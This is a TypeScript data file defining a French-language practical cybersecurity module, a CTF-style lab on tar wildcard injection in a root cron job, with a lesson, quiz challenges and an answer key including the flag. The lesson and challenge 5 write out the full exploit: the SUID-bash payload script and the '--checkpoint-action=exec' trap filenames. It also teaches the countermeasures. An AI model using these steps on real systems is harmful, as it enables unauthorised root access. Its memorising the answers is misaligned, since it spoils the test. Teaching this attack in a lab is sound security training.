import type { CourseSeed } from "../../../types";

/** Cyber · Pratique — Module 22 : injection par joker tar dans une tâche cron root. Lab Docker réel (mono-conteneur). */
export const module22TarWildcard: CourseSeed[] = [
  {
    slug: "prat-tar-wildcard",
    title: "Injection par joker tar (cron root)",
    checkpoint: "cybersecurite-pratique",
    codename: "Silent Wildcard",
    domain: "Élévation de privilèges",
    theme: "grid",
    icon: "Bug",
    accent: "#C4A46B",
    order: 22,
    difficulty: "hard",
    summary:
      "Une tâche cron root archive un dossier chaque minute avec `tar czf ... *`. Le script est inattaquable tel quel — mais le shell développe `*` en noms de fichiers AVANT tar. En créant des fichiers dont le NOM commence par `--`, tu les transformes en options tar, dont une exécute ta commande… en root.",
    objectives: [
      "Repérer une tâche cron root et son dossier source inscriptible",
      "Comprendre le développement du joker `*` par le shell",
      "Détourner les options `--checkpoint` de GNU tar",
      "Obtenir un shell root via un binaire SUID déposé par la tâche",
      "Prévenir l'injection par argument (`--`, chemins explicites)",
    ],
    sandbox: {
      attackerImage: "cyberace/module22-tar-wildcard-lab:latest",
      ttlSec: 1500,
      attackerCapAdd: [],
      ports: [{ containerPort: 7681, label: "Terminal web (ttyd)" }],
    },
    lesson: `# 🐛 Injection par joker tar — Silent Wildcard

Une **septième voie** d'élévation. Au Module 5, tu modifiais un **script** cron directement. Ici, le script est **inattaquable** — c'est sa manière d'utiliser \`*\` qui te livre root. ⏳🏎️

---

## 🧭 Le briefing

> Une **tâche cron** s'exécute en **root chaque minute** et archive un dossier avec \`tar czf ... *\`. Le dossier source est **inscriptible par tous**. Le script lui-même, tu ne peux pas le modifier — vise plutôt **les noms de fichiers** qu'il va archiver.

⏳ **Latence** : comme au Module 5, il faut **attendre** la prochaine minute pour que le cron se déclenche.

---

## 1. Le développement du joker par le shell 🧩

Quand le script fait \`tar czf archive.tar.gz *\`, ce n'est **pas** \`tar\` qui voit \`*\` : c'est le **shell** qui remplace \`*\` par la **liste des fichiers** du dossier **avant** de lancer \`tar\`. Si le dossier contient \`a.txt\`, \`b.log\`, la commande réelle devient :

\`\`\`bash
tar czf archive.tar.gz a.txt b.log
\`\`\`

**Le piège :** si un fichier s'appelle \`--checkpoint=1\`, le shell le passe **tel quel** à tar — qui l'interprète comme une **option**, pas comme un fichier !

---

## 2. Les options détournées de GNU tar 🎯

GNU tar possède deux options qui, combinées, exécutent une commande :

- \`--checkpoint=1\` : déclenche un « point de contrôle » après le 1er fichier ;
- \`--checkpoint-action=exec=<commande>\` : **exécute** une commande à ce point de contrôle.

Comme la tâche cron tourne en **root**, la commande s'exécute **en root**.

---

## 3. Poser le piège 🪤

Dans le dossier inscriptible \`/var/backups/data/\` :

\`\`\`bash
cd /var/backups/data

# 1) un payload qui fabrique un bash SUID root
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > payload.sh
chmod +x payload.sh

# 2) les fichiers-pièges dont le NOM est une option tar
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payload.sh'
\`\`\`

> Le \`--\` de \`touch --\` évite que **touch** interprète lui-même ces noms comme ses propres options.

---

## 4. Attendre et exploiter ⏳

À la prochaine minute, le cron lance \`tar czf ... *\` → le shell développe \`*\` en incluant tes fichiers-pièges → tar exécute \`payload.sh\` **en root** → un \`/tmp/rootbash\` **SUID** apparaît :

\`\`\`bash
/tmp/rootbash -p          # shell root (-p préserve l'euid)
cat /root/flag.txt
\`\`\`

---

## 5. La contre-mesure 🛡️

Deux réflexes :
- **Empêcher tar d'interpréter un nom comme une option** : préfixer par \`--\` (\`tar czf archive.tar.gz -- *\`) ou par un chemin explicite (\`./*\`).
- **Restreindre** les permissions du dossier source (pas de \`777\`).

---

## 🧠 À retenir

- Le **shell développe \`*\`** en noms de fichiers **avant** l'exécution de la commande.
- Un fichier nommé \`--quelquechose\` devient une **option** aux yeux de \`tar\`.
- \`--checkpoint=1\` + \`--checkpoint-action=exec=...\` = **exécution de commande** (ici en root via cron).
- Parade : \`./*\` ou \`-- *\`, et un dossier source **non inscriptible** par tous.
- Technique réelle, applicable aussi à \`chown\`, \`rsync\`, etc.`,
    badge: {
      id: "badge-prat-tarwildcard",
      name: "Dompteur de Jokers",
      icon: "Bug",
      description: "A transformé un simple caractère générique en accès root.",
    },
    challenges: [
      {
        id: "prat-tarwildcard-t1",
        title: "Qui suis-je ?",
        order: 1,
        difficulty: "easy",
        type: "text",
        prompt: `## 🧭 Qui suis-je ?

Démarre le lab. Identifie ton compte :

\`\`\`bash
id
\`\`\`

**Question :** quelle **commande** affiche l'utilisateur courant et ses groupes ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        answer: "id",
        caseSensitive: false,
        explanation: `**\`id\`** confirme que tu es \`stagiaire\`, non privilégié.`,
        tags: ["tar", "recon", "id"],
      },
      {
        id: "prat-tarwildcard-t2",
        title: "Repérer la tâche cron",
        order: 2,
        difficulty: "easy",
        type: "text",
        prompt: `## 🕒 La tâche cron

\`\`\`bash
cat /etc/cron.d/*
\`\`\`

**Question :** quel **script** est exécuté en root chaque minute ?`,
        points: 100,
        timeLimitSec: 300,
        hints: [],
        answer: "/opt/backup/archive.sh",
        accept: ["archive.sh"],
        caseSensitive: true,
        explanation: `Le fichier \`/etc/cron.d/archive\` lance **\`/opt/backup/archive.sh\`** en root chaque minute. Ce script fait \`tar czf ... *\` dans un dossier — c'est le vecteur.`,
        tags: ["tar", "cron"],
      },
      {
        id: "prat-tarwildcard-t3",
        title: "Vérifier les permissions du dossier source",
        order: 3,
        difficulty: "medium",
        type: "text",
        prompt: `## 📂 Le dossier source

\`\`\`bash
ls -la /var/backups/
\`\`\`

**Question :** quel **dossier**, source de l'archive, est ici inscriptible par tous ?`,
        points: 150,
        timeLimitSec: 350,
        hints: [],
        answer: "/var/backups/data",
        accept: ["data"],
        caseSensitive: false,
        explanation: `**\`/var/backups/data\`** est en \`777\` (inscriptible par tous). C'est là que \`tar\` développe \`*\` — donc là que tu déposes tes fichiers-pièges.`,
        tags: ["tar", "permissions"],
      },
      {
        id: "prat-tarwildcard-t4",
        title: "Comprendre l'injection par joker",
        order: 4,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🧩 Pourquoi un nom en \`--\` pose problème

**Question :** pourquoi nommer un fichier \`--checkpoint=1\` dans ce dossier pose-t-il problème lors de l'exécution de \`tar ... *\` ?`,
        points: 150,
        timeLimitSec: 400,
        hints: [],
        options: [
          "Le shell développe `*` en liste de noms de fichiers AVANT que tar ne s'exécute ; un nom commençant par `--` est alors interprété par tar comme une option, pas comme un fichier",
          "tar refuse toujours les noms de fichiers commençant par un tiret",
          "Le shell bloque automatiquement les noms de fichiers suspects",
          "C'est une fonctionnalité de sécurité de tar, pas une faille",
        ],
        answer: 0,
        explanation: `Le **shell** remplace \`*\` par les noms de fichiers **avant** de lancer tar. Un nom \`--checkpoint=1\` arrive alors à tar comme une **option** — pas comme un fichier à archiver.`,
        tags: ["tar", "wildcard", "shell"],
      },
      {
        id: "prat-tarwildcard-t5",
        title: "Préparer les fichiers pièges",
        order: 5,
        difficulty: "medium",
        type: "text",
        prompt: `## 🪤 Les fichiers-pièges

Dans \`/var/backups/data/\`, crée le payload et les deux fichiers dont le nom est une option tar :

\`\`\`bash
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > payload.sh
chmod +x payload.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payload.sh'
\`\`\`

**Question :** quelle **option GNU tar**, détournée ici, permet d'exécuter une commande arbitraire à un certain stade de l'archivage ?`,
        points: 200,
        timeLimitSec: 450,
        hints: [],
        answer: "--checkpoint-action",
        accept: ["checkpoint-action"],
        caseSensitive: false,
        explanation: `**\`--checkpoint-action=exec=...\`** exécute une commande au point de contrôle défini par \`--checkpoint=1\`. Nommés comme des fichiers, ils sont passés à tar par le développement du joker.`,
        tags: ["tar", "checkpoint-action"],
      },
      {
        id: "prat-tarwildcard-t6",
        title: "Attendre et exploiter (flag)",
        order: 6,
        difficulty: "hard",
        type: "text",
        prompt: `## 🎯 Attendre le cron, puis exploiter

Attends jusqu'à **60 secondes** (prochaine minute). Le cron lance tar, qui exécute ton payload en root → un \`/tmp/rootbash\` SUID apparaît :

\`\`\`bash
/tmp/rootbash -p
cat /root/flag.txt
\`\`\`

**Question :** colle le **flag**.`,
        points: 300,
        timeLimitSec: 800,
        hints: [
          { text: "Il faut ATTENDRE la prochaine minute pleine pour que le cron se déclenche. Vérifie l'apparition de /tmp/rootbash.", cost: 20 },
          { text: "Les deux fichiers exacts : touch -- '--checkpoint=1' et touch -- '--checkpoint-action=exec=sh payload.sh'", cost: 35 },
        ],
        answer: "CYBERACE{tar_wildcard_injection_cron_racine}",
        caseSensitive: true,
        explanation: `tar exécute \`payload.sh\` en root → \`/tmp/rootbash\` SUID → \`/tmp/rootbash -p\` ouvre un shell root → \`cat /root/flag.txt\` révèle \`CYBERACE{tar_wildcard_injection_cron_racine}\`.`,
        tags: ["tar", "flag", "suid"],
      },
      {
        id: "prat-tarwildcard-t7",
        title: "Contre-mesure",
        order: 7,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🛡️ Contre-mesure

**Question :** quelle pratique aurait empêché cette injection, en plus de restreindre les permissions du dossier ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "Préfixer l'argument par `--` ou par un chemin explicite (`./*`) pour empêcher tar d'interpréter un nom de fichier comme une option",
          "Utiliser un mot de passe pour lancer tar",
          "Désactiver complètement cron",
          "Compresser avec gzip au lieu de tar",
        ],
        answer: 0,
        explanation: `\`tar czf archive.tar.gz -- *\` ou \`./*\` force tar à traiter les arguments comme des **fichiers**, jamais comme des options — neutralisant l'injection, même dans un dossier inscriptible.`,
        tags: ["tar", "contre-mesure"],
      },
      {
        id: "prat-tarwildcard-t8",
        title: "Synthèse",
        order: 8,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 🎓 Synthèse

**Question :** en quoi ce module diffère-t-il du Module 5, qui exploitait aussi une tâche cron ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        options: [
          "Ici la faille vient de l'interprétation des arguments de la commande (joker tar), pas d'un fichier de script directement modifiable",
          "Ce module n'utilise pas de tâche cron",
          "Ce module ne nécessite aucune attente",
          "Il s'agit exactement de la même vulnérabilité",
        ],
        answer: 0,
        explanation: `Au Module 5, le **script** cron était directement modifiable. Ici le script est **sain** : la faille naît de l'**interprétation des arguments** (\`*\` développé + noms en \`--\`). Même déclencheur (cron), vulnérabilité différente.`,
        tags: ["tar", "synthese"],
      },
    ],
  },
];
